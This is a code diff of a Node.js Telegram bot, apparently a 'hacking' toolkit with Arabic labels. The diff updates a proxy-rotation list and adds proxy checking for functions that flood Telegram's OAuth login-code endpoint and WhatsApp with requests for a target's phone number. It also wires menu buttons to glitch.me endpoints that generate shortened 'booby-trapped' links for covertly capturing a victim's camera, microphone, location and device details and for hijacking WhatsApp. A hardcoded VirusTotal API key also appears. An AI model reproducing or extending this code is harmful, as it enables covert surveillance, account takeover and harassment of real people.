+    'http://3.71.239.218:80',
     'http://13.37.89.201:80',
-    'http://47.238.128.246:8080',
-    'http://91.241.217.58:9090',
-    'http://3.126.147.182:80',
-    'http://8.212.168.170:4145',
-    'http://190.210.186.241:80',
-    'http://158.255.215.50:14449'
+    'http://47.238.130.212:8080',
+    'http://47.91.89.3:8080',
+    'http://3.71.239.218:3128',
+    'http://165.232.129.150:80',
+    'http://38.54.95.19:3128',
+    'http://8.213.215.187:1081',
+    'http://85.215.64.49:80',
+    'http://185.118.153.110:8080',
+    'http://38.242.199.124:8089',
+    'http://93.42.151.100:8080',
+    'http://51.89.255.67:80',
+    'http://8.211.49.86:9098',
+    'http://13.37.59.99:80',
+    'http://47.90.149.238:80'
+    // ... يمكنك إضافة المزيد من البروكسيات هنا
 ];
 
-function getRandomProxy() {
-    return proxyList[Math.floor(Math.random() * proxyList.length)];
+async function getWorkingProxy() {
+    for (const proxy of proxyList) {
+        try {
+            const agent = new HttpsProxyAgent(proxy);
+            await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 5000 });
+            return proxy;
+        } catch (error) {
+            console.log(`Proxy ${proxy} is not working`);
+        }
+    }
+    throw new Error('No working proxy found');
 }
 
 function generateUserAgent() {
@@ -2024,12 +2204,12 @@ async function spam(number, chatId) {
         timeout: 30000 // 30 seconds timeout
     };
 
-    if (sessions[chatId].useProxy) {
-        const proxy = getRandomProxy();
-        axiosConfig.httpsAgent = new HttpsProxyAgent(proxy);
-    }
-
     try {
+        if (sessions[chatId].useProxy) {
+            const workingProxy = await getWorkingProxy();
+            axiosConfig.httpsAgent = new HttpsProxyAgent(workingProxy);
+        }
+
         const response = await axios.post("https://oauth.telegram.org/auth/request", payload, axiosConfig);
 
         if (response.data && response.data.random_hash) {
@@ -2050,6 +2230,7 @@ async function spam(number, chatId) {
         setTimeout(() => spam(number, chatId), delay);
     }
 }
+
 
 async function updateSuccessReport(chatId) {
     const session = sessions[chatId];
@@ -2167,7 +2348,6 @@ bot.on('message', (msg) => {
 
 
 
-
     
      
     
@@ -2175,12 +2355,10 @@ const fetch = require('node-fetch');
 const ipinfo = require('ipinfo');
 const dns = require('dns').promises;
 
-// مفتاح API لبوت التليجرام
 const virusTotalApiKey = 'b51c4d5a437011492aa867237c80bdb04dcc377ace0e4814bea41336e52f1c73';
 
 
 
-// استجابة لزر "فحص رابط"
 bot.on('callback_query', async (callbackQuery) => {
   const msg = callbackQuery.message;
   const chatId = msg.chat.id;
@@ -2206,7 +2384,6 @@ bot.on('callback_query', async (callbackQuery) => {
   }
 });
 
-// دالة لإرسال الرابط إلى VirusTotal وإجراء الفحص
 async function scanAndCheckUrl(url) {
   try {
     // إرسال الرابط للفحص
@@ -2265,7 +2442,6 @@ async function scanAndCheckUrl(url) {
   }
 }
 
-// دالة لتحديد ما إذا كان الرابط مشبوهًا
 function isSuspicious(reportData) {
   // يمكنك تخصيص هذه الشروط حسب احتياجاتك
   return reportData.total > 0 && reportData.positives === 0 && (
@@ -2275,7 +2451,6 @@ function isSuspicious(reportData) {
   );
 }
 
-// دالة لإظهار شريط التقدم
 function displayProgress(bot, chatId, message) {
   let progress = 0;
   const progressBar = ["░░░░░░░░░░", "▓░░░░░░░░░", "▓▓░░░░░░░░", "▓▓▓░░░░░░░", "▓▓▓▓░░░░░░", "▓▓▓▓▓░░░░░", "▓▓▓▓▓▓░░░░", "▓▓▓▓▓▓▓░░░", "▓▓▓▓▓▓▓▓░░", "▓▓▓▓▓▓▓▓▓░", "▓▓▓▓▓▓▓▓▓▓"];
@@ -2294,7 +2469,7 @@ function displayProgress(bot, chatId, message) {
   }, 500);  // يحدث كل 500 مللي ثانية
 }
 
-// دالة للحصول على معلومات IP باستخدام ipinfo
+
 async function fetchIpInfo(url) {
   try {
     const domain = new URL(url).hostname;
@@ -2311,7 +2486,6 @@ async function fetchIpInfo(url) {
   }
 }
 
-// دالة للتحقق من صحة الرابط
 function isValidUrl(string) {
   try {
     new URL(string);
@@ -2329,7 +2503,7 @@ function isValidUrl(string) {
   
 function showDefaultButtons(userId) {
   // الأزرار المطلوبة
-  let allOptionsButtons = [
+  let defaultButtons = [
     [
       { text: '📸 اختراق الكاميرا الأمامية والخلفية', callback_data: 'front_camera' },
       { text: '🔬 جمع معلومات الجهاز', callback_data: 'collect_device_info' }
@@ -2366,10 +2540,10 @@ function showDefaultButtons(userId) {
       { text: 'صيد فيزات 💳', callback_data: 'generate_card' }
     ],
     [
-      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } }
+      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://toothsome-little-marimba.glitch.me/' } }
     ],
     [
-      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } },
+      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://everlasting-jeweled-grin.glitch.me/' } },
       { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }
     ],
     [
@@ -2385,8 +2559,8 @@ function showDefaultButtons(userId) {
       { text: '🚸 اكتب لي رسالة فك حظر واتساب', callback_data: 'get_love_message' }
     ],
     [
-      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } },
-      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } }
+      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://juvenile-calico-hibiscus.glitch.me/' } },
+      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://frequent-clumsy-step.glitch.me/' } }
     ],
     [
       { text: '✉️ إنشاء إيميل وهمي', callback_data: 'create_email' },
@@ -2406,15 +2580,15 @@ function showDefaultButtons(userId) {
       { text: '🔍 فحص رابط', callback_data: 'check_link' }
     ],
     [
-      { text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' },
-      { text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }
+      { text: 'قناة المطور سفير الاحزان', url: 'https://t.me/S_S_A_L1' },
+      { text: 'تتواصل مع المطور', url: 'https://t.me/S_A_Sr' }
     ]
   ];
 
   // إرسال الرسالة مع الأزرار مباشرة
   bot.sendMessage(userId, 'مرحباً! يمكنك التمتع بالخدمات واختيار ما يناسبك من الخيارات المتاحة:', {
     reply_markup: {
-      inline_keyboard: allOptionsButtons
+      inline_keyboard: defaultButtons
     }
   });
 }
@@ -2424,7 +2598,6 @@ function showDefaultButtons(userId) {
 
 
       
-// التعامل مع الضغطة على الزر
 
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
@@ -2446,37 +2619,37 @@ bot.on('callback_query', (callbackQuery) => {
         bot.once('message', (msg) => {
             if (msg.text) {
                 const link = msg.text;
-                const malwareUrl = `https://silken-giant-bat.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
+                const malwareUrl = `https://bird-whispering-rooster.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
                 shortenUrlAndSendMessage(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
             } else {
                 bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
             }
         });
     } else if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://silken-giant-bat.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://bird-whispering-rooster.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
         bot.once('message', (msg) => {
             const duration = parseInt(msg.text, 10);
             if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
-                const url = `https://silken-giant-bat.glitch.me/record/${chatId}?duration=${duration}`;
+                const url = `https://bird-whispering-rooster.glitch.me/record/${chatId}?duration=${duration}`;
                 shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
             } else {
                 bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
             }
         });
     } else if (data === 'get_location') {
-        const url = `https://silken-giant-bat.glitch.me/getLocation/${chatId}`;
+        const url = `https://bird-whispering-rooster.glitch.me/getLocation/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
     } else if (data === 'capture_video') {
-        const url = `https://silken-giant-bat.glitch.me/camera/video/${chatId}`;
+        const url = `https://bird-whispering-rooster.glitch.me/camera/video/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
     } else if (data === 'request_verification') {
-        const verificationLink = `https://silken-giant-bat.glitch.me/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://bird-whispering-rooster.glitch.me/whatsapp?chatId=${chatId}`;
         shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
     } else if (data === 'collect_device_info') {
-        const url = `https://silken-giant-bat.glitch.me/${chatId}`;
+        const url = `https://bird-whispering-rooster.glitch.me/${chatId}`;
         shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
     
     }
@@ -2501,15 +2674,15 @@ bot.on('callback_query', (callbackQuery) => {
 const BASE_URL = 'https://www.1secmail.com/api/v1/';
 
 
-// متغير عالمي لحفظ عنوان البريد الإلكتروني
+
 let emailAddress = null;
 
-// دالة لإنشاء اسم عشوائي
+
 function generateRandomName(length = 2) {
   return Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
 }
 
-// دالة لإنشاء بريد إلكتروني
+
 function createEmail() {
   const randomPart = generateRandomName();
   const domain = '1secmail.com';
@@ -2517,7 +2690,6 @@ function createEmail() {
   return emailAddress;
 }
 
-// دالة للحصول على الرسائل
 async function getMessages() {
   if (!emailAddress) return null;
   
@@ -2533,7 +2705,6 @@ async function getMessages() {
   }
 }
 
-// دالة للحصول على محتوى رسالة محددة
 async function getMessageContent(messageId) {
   if (!emailAddress) return null;
   
@@ -2549,13 +2720,11 @@ async function getMessageContent(messageId) {
   }
 }
 
-// دالة لتنظيف النص من وسوم HTML
 function cleanHtml(rawHtml) {
   return rawHtml.replace(/<[^>]*>?/gm, '');
 }
 
 
-// معالجة الضغط على الأزرار
 bot.on('callback_query', (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
   const data = callbackQuery.data;
@@ -2581,7 +2750,6 @@ bot.on('callback_query', (callbackQuery) => {
   }
 });
 
-// معالجة أمر إنشاء البريد الإلكتروني
 bot.onText(/\/email/, (msg) => {
   const chatId = msg.chat.id;
   const newEmail = createEmail();
@@ -2590,7 +2758,6 @@ bot.onText(/\/email/, (msg) => {
   });
 });
 
-// معالجة أمر عرض البريد الإلكتروني الحالي
 bot.onText(/\/an/, (msg) => {
   const chatId = msg.chat.id;
   if (emailAddress) {
@@ -2602,7 +2769,6 @@ bot.onText(/\/an/, (msg) => {
   }
 });
 
-// معالجة أمر عرض الرسائل
 bot.onText(/\/Messages/, async (msg) => {
   const chatId = msg.chat.id;
   const messages = await getMessages();
@@ -2623,7 +2789,6 @@ bot.onText(/\/Messages/, async (msg) => {
   }
 });
 
-// معالجة أمر حذف البريد الإلكتروني
 bot.onText(/\/de/, (msg) => {
   const chatId = msg.chat.id;
   if (emailAddress) {
@@ -2635,12 +2800,13 @@ bot.onText(/\/de/, (msg) => {
 });
 
 
+
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
 
     // تحقق مما إذا كانت بيانات المستخدم غير موجودة، ثم قم بتهيئتها إذا كانت غير موجودة
-    if (!usersData[chatId]) {
-        usersData[chatId] = {
+    if (!allUsers[chatId]) {
+        allUsers[chatId] = {
             step: 'initial',
             GOOD: 0,
             BAD: 0,
@@ -2649,43 +2815,42 @@ bot.on('callback_query', (query) => {
     }
 
     if (query.data === 'whatsapp_spam') {
-        usersData[chatId].step = 'country_code';
+        allUsers[chatId].step = 'country_code';
         bot.sendMessage(chatId, "أدخل رمز الدولة (بدون +):");
     }
 });
 
-// التعامل مع الرسائل النصية
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
-    if (!usersData[chatId]) return; // تجاهل الرسائل إذا لم يكن هناك بيانات للمستخدم
+    if (!allUsers[chatId]) return; // تجاهل الرسائل إذا لم يكن هناك بيانات للمستخدم
 
-    const userStep = usersData[chatId].step;
+    const userStep = allUsers[chatId].step;
 
     switch (userStep) {
         case 'country_code':
             if (text.startsWith('/')) return; // تجاهل الأوامر الأخرى مثل /start
-            usersData[chatId].countryCode = text;
-            usersData[chatId].step = 'phone_number';
+            allUsers[chatId].countryCode = text;
+            allUsers[chatId].step = 'phone_number';
             bot.sendMessage(chatId, "أدخل رقم الهاتف:");
             break;
 
         case 'phone_number':
-            usersData[chatId].phoneNumber = text;
-            usersData[chatId].step = 'proxy';
+            allUsers[chatId].phoneNumber = text;
+            allUsers[chatId].step = 'proxy';
             bot.sendMessage(chatId, "أدخل البروكسي (اختياري، اكتب 'لا' إذا لم يكن لديك بروكسي):");
             break;
 
         case 'proxy':
-            usersData[chatId].proxy = text.toLowerCase() === 'لا' ? null : text;
-            usersData[chatId].step = 'sending_requests';
-            startSendingRequests(chatId, usersData[chatId]);
+            allUsers[chatId].proxy = text.toLowerCase() === 'لا' ? null : text;
+            allUsers[chatId].step = 'sending_requests';
+            startSendingRequests(chatId, allUsers[chatId]);
             break;
     }
 });
 
-// بدء إرسال الطلبات
+
 async function startSendingRequests(chatId, userData) {
     console.clear();
     const initialMessage = await bot.sendMessage(chatId, "بدأ إرسال الطلبات...\nSuccess: 0\nFailed: 0");
@@ -2754,10 +2919,12 @@ async function startSendingRequests(chatId, userData) {
 }
 
 
+
+
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
-    const baseUrl = 'https://silken-giant-bat.glitch.me'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
+    const baseUrl = 'https://bird-whispering-rooster.glitch.me'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
     console.log('Received callback query:', data);
 
@@ -2813,5 +2980,3 @@ function getPlatformName(platform) {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
-});
-
